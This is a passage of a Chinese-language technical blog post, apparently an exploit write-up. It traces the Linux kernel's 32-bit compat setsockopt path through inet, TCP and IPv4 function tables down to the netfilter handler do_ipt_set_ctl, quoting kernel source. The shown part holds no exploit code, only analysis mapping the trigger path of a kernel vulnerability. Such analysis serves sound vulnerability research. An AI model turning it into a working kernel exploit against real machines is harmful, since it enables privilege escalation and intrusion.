class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Call get/setsockopt() */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_sockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val,</span><br><span class="hljs-params">      <span class="hljs-type">char</span> __user *opt, <span class="hljs-type">int</span> *len, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ops = nf_sockopt_find(sk, pf, val, get);<br><span class="hljs-keyword">if</span> (IS_ERR(ops))<br><span class="hljs-keyword">return</span> PTR_ERR(ops);<br><br><span class="hljs-keyword">if</span> (get)<br>ret = ops-&gt;get(sk, val, opt, len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;<span class="hljs-built_in">set</span>(sk, val, opt, *len);<br><br>module_put(ops-&gt;owner);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">nf_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val, <span class="hljs-type">char</span> __user *opt,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">return</span> nf_sockopt(sk, pf, val, opt, &amp;len, <span class="hljs-number">0</span>);<br>&#125;<br>EXPORT_SYMBOL(nf_setsockopt);<br></code></pre></td></tr></table></figure><p>这里我们看出其通过 <code>nf_sockopt_find</code> 找到对应的函数表从而调用其对应的函数，这里 setsockopt 对应调用到的应该是 <code>do_ipt_set_ctl()</code></p><p><img src="https://s2.loli.net/2022/03/29/R4a7BPc8zq9Ko25.png" alt="image.png"></p><p>为什么是这个函数？这里我们回到 <code>nf_sockopt_find</code> 中，其使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_sockopt_ops *<span class="hljs-title function_">nf_sockopt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params"><span class="hljs-type">int</span> val, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><br>mutex_lock(&amp;nf_sockopt_mutex);<br>list_for_each_entry(ops, &amp;nf_sockopts, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;pf == pf) &#123;<br><span class="hljs-keyword">if</span> (!try_module_get(ops-&gt;owner))<br><span class="hljs-keyword">goto</span> out_nosup;<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;<br>val &lt; ops-&gt;get_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;<br>val &lt; ops-&gt;set_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>module_put(ops-&gt;owner);<br>&#125;<br>&#125;<br>out_nosup:<br>ops = ERR_PTR(-ENOPROTOOPT);<br>out:<br>mutex_unlock(&amp;nf_sockopt_mutex);<br><span class="hljs-keyword">return</span> ops;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ip_tables_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Register setsockopt */</span><br>ret = nf_register_sockopt(&amp;ipt_sockopts);<br></code></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> <span class="hljs-title">ipt_sockopts</span> =</span> &#123;<br>.pf= PF_INET,<br>.set_optmin= IPT_BASE_CTL,<br>.set_optmax= IPT_SO_SET_MAX+<span class="hljs-number">1</span>,<br>.<span class="hljs-built_in">set</span>= do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_set= compat_do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.get_optmin= IPT_BASE_CTL,<br>.get_optmax= IPT_SO_GET_MAX+<span class="hljs-number">1</span>,<br>.get= do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_get= compat_do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="32-位下的-setsockopt-系统调用"><a href="#32-位下的-setsockopt-系统调用" class="headerlink" title="32 位下的 setsockopt 系统调用"></a>32 位下的 setsockopt 系统调用</h2><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在设置了 <code>CONFIG_COMPAT=y</code> 的情况下（意为兼容 32 位，默认开启），32位程序进行系统调用时<strong>实际上是通过 COMPAT_SYSCALL_DEFINE 宏定义的兼容 32 位系统调用完成的</strong></p><blockquote><p>我们知道 32 位程序通过 0x80 号中断进行系统调用，而 64 位程序则通过 syscall 指令完成系统调用，因此在64位内核中将 0x80 号中断专门用作兼容 32 位进程的系统调用入口</p></blockquote><p>因此当一个 32 位程序进行 setsockopt 系统调用时，最终会调用到 <code>__compat_sys_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">COMPAT_SYSCALL_DEFINE5(setsockopt, <span class="hljs-type">int</span>, fd, <span class="hljs-type">int</span>, level, <span class="hljs-type">int</span>, optname,<br>       <span class="hljs-type">char</span> __user *, optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, optlen)<br>&#123;<br><span class="hljs-keyword">return</span> __compat_sys_setsockopt(fd, level, optname, optval, optlen);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>其实 glibc 中的 setsockopt 的 wrapper 是通过 <code>socketcall</code> 这一系统调用进行的，实际上在很久以前该系统调用其实是 socket 相关系统调用的唯一入口点，后面各种子功能拆分成了多个系统调用，但是该系统调用仍然保留了下来，因此对于同一个功能，即可以走 socketcall 系统调用，也可以走拆分出来的那个系统调用，最后的路径是相同的</p></blockquote><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，故在 <code>__compat_sys_setsockopt()</code>中最终会走到 <code>sock-&gt;ops-&gt;compat_setsockopt</code> 或 <code>sock-&gt;ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __compat_sys_setsockopt(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,<br>   <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)<br>&#123;<br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><br><span class="hljs-keyword">if</span> (optlen &gt; INT_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock = sockfd_lookup(fd, &amp;err);<br><span class="hljs-keyword">if</span> (sock) &#123;<br>err = security_socket_setsockopt(sock, level, optname);<br><span class="hljs-keyword">if</span> (err) &#123;<br>sockfd_put(sock);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">if</span> (level == SOL_SOCKET)<br>err = compat_sock_setsockopt(sock, level,<br>optname, optval, optlen);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sock-&gt;ops-&gt;compat_setsockopt)<br>err = sock-&gt;ops-&gt;compat_setsockopt(sock, level,<br>optname, optval, optlen);<br><span class="hljs-keyword">else</span><br>err = sock-&gt;ops-&gt;setsockopt(sock, level,<br>optname, optval, optlen);<br>sockfd_put(sock);<br>&#125;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里应该走入哪条路径？那么这里我们需要先看创建该函数表的过程，这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br>    <span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br>    <span class="hljs-comment">//...</span><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br>err = -EAFNOSUPPORT;<br><span class="hljs-keyword">if</span> (!pf)<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We will call the -&gt;create function, that possibly is in a loadable</span><br><span class="hljs-comment"> * module, so we have to bump that loadable module refcnt first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!try_module_get(pf-&gt;owner))<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/* Now protected by module ref count */</span><br>rcu_read_unlock();<br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">inet_family_ops</span> =</span> &#123;<br>.family = PF_INET,<br>.create = inet_create,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Tell SOCKET that we are alive...</span><br><span class="hljs-comment"> */</span><br><br>(<span class="hljs-type">void</span>)sock_register(&amp;inet_family_ops);<br></code></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">inet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params">       <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> *<span class="hljs-title">answer</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_sock</span> *<span class="hljs-title">inet</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> *<span class="hljs-title">answer_prot</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer_flags;<br><span class="hljs-type">int</span> try_loading_module = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (protocol &lt; <span class="hljs-number">0</span> || protocol &gt;= IPPROTO_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br><span class="hljs-comment">/* Look for the requested type/protocol pair. */</span><br>lookup_protocol:<br>err = -ESOCKTNOSUPPORT;<br>rcu_read_lock();<br>list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="hljs-built_in">list</span>) &#123;<br><br>err = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* Check the non-wild match. */</span><br><span class="hljs-keyword">if</span> (protocol == answer-&gt;protocol) &#123;<br><span class="hljs-keyword">if</span> (protocol != IPPROTO_IP)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Check for the two wild cases. */</span><br><span class="hljs-keyword">if</span> (IPPROTO_IP == protocol) &#123;<br>protocol = answer-&gt;protocol;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>err = -EPROTONOSUPPORT;<br>&#125;<br>    <span class="hljs-comment">//...</span><br>    sock-&gt;ops = answer-&gt;ops;<br>    answer_prot = answer-&gt;prot;<br></code></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> <span class="hljs-title">inetsw_array</span>[] =</span><br>&#123;<br>&#123;<br>.type =       SOCK_STREAM,<br>.protocol =   IPPROTO_TCP,<br>.prot =       &amp;tcp_prot,<br>.ops =        &amp;inet_stream_ops,<br>.flags =      INET_PROTOSW_PERMANENT |<br>      INET_PROTOSW_ICSK,<br>&#125;,<br></code></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的函数，这里因为我们开启了编译选项 <code>CONFIG_COMPAT</code>（默认开启），<strong>所以 setsockopt 系统调用最终应该会调用到</strong><code>compat_sock_common_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto_ops</span> <span class="hljs-title">inet_stream_ops</span> =</span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt = compat_sock_common_setsockopt,<br>.compat_getsockopt = compat_sock_common_getsockopt,<br>.compat_ioctl   = inet_compat_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.set_rcvlowat   = tcp_set_rcvlowat,<br>&#125;;<br></code></pre></td></tr></table></figure><p>他又会调用到 <code>sk-&gt;sk_prot-&gt;compat_setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>compat_setsockopt</code> 函数指针（<del>你套你🦄呢</del>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_sock_common_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><br><span class="hljs-keyword">if</span> (sk-&gt;sk_prot-&gt;compat_setsockopt != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;compat_setsockopt(sk, level, optname,<br>      optval, optlen);<br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(compat_sock_common_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>又绕回到 <code>inet_create</code>，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>compat_tcp_setsockopt()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> <span class="hljs-title">tcp_prot</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;TCP&quot;</span>,<br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt= compat_tcp_setsockopt,<br>.compat_getsockopt= compat_tcp_getsockopt,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.diag_destroy= tcp_abort,<br>&#125;;<br>EXPORT_SYMBOL(tcp_prot);<br></code></pre></td></tr></table></figure><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>inet_csk_compat_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_tcp_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-keyword">if</span> (level != SOL_TCP)<br><span class="hljs-keyword">return</span> inet_csk_compat_setsockopt(sk, level, optname,<br>  optval, optlen);<br><span class="hljs-keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(compat_tcp_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在 <code>inet_csk_compat_setsockopt</code> 中会调用到 <code>icsk-&gt;icsk_af_ops-&gt;compat_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">inet_csk_compat_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">       <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br><span class="hljs-keyword">if</span> (icsk-&gt;icsk_af_ops-&gt;compat_setsockopt)<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;compat_setsockopt(sk, level, optname,<br>    optval, optlen);<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,<br>     optval, optlen);<br>&#125;<br>EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 <strong>socket 中 sock 结构体的初始化过程</strong>，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tcp_v4_init_sock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br>tcp_init_sock(sk);<br><br>icsk-&gt;icsk_af_ops = &amp;ipv4_specific;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TCP_MD5SIG</span><br>tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以最后应该调用到 <code>compat_ip_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock_af_ops</span> <span class="hljs-title">ipv4_specific</span> =</span> &#123;<br>.queue_xmit   = ip_queue_xmit,<br>.send_check   = tcp_v4_send_check,<br>.rebuild_header   = inet_sk_rebuild_header,<br>.sk_rx_dst_set   = inet_sk_rx_dst_set,<br>.conn_request   = tcp_v4_conn_request,<br>.syn_recv_sock   = tcp_v4_syn_recv_sock,<br>.net_header_len   = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> iphdr),<br>.setsockopt   = ip_setsockopt,<br>.getsockopt   = ip_getsockopt,<br>.addr2sockaddr   = inet_csk_addr2sockaddr,<br>.sockaddr_len   = <span 